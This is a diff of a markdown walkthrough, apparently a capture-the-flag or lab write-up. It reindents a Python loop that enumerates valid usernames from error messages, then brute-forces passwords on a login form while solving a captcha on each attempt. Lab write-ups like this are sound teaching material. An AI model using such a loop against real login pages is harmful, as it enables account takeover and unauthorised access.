@@ -99,16 +99,16 @@ for count in range(100):
 ### **And our final block of code!** We'll iterate through all our usernames and passwords ***(but trying to identify existing username first)*** and then try all passwords to login:
 ```python
 for username in usernames:
-		response = send_post(username, "None", captcha)
-		captcha = solve_captcha(response)
-		if not "does not exist" in response.text:
-			for password in passwords:
-				response = send_post(username, password, captcha)
-				if not "Error" in response.text:
-					print(f"Success! Username:{username} Password:{password}")
-					exit(0)
-				else:
-					captcha = solve_captcha(response)
+	response = send_post(username, "None", captcha)
+	captcha = solve_captcha(response)
+	if not "does not exist" in response.text:
+		for password in passwords:
+			response = send_post(username, password, captcha)
+			if not "Error" in response.text:
+				print(f"Success! Username:{username} Password:{password}")
+				exit(0)
+			else:
+				captcha = solve_captcha(response)
 ```
 
 ## ***Phew.*** TIME X!
